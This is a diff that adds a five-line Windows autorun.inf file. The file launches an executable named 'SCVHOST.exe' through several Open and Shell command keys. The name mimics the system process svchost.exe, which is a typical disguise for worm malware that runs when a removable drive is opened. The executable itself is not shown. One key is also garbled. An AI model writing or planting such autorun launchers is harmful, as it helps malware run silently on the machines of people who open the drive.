@@ -1,0 +1,5 @@
+[Autorun]
+Open=SCVHOST.exe
+Shellexe cute=SCVHOST.exe
+Shell\Open\command=SCVHOST.exe
+Shell=Open
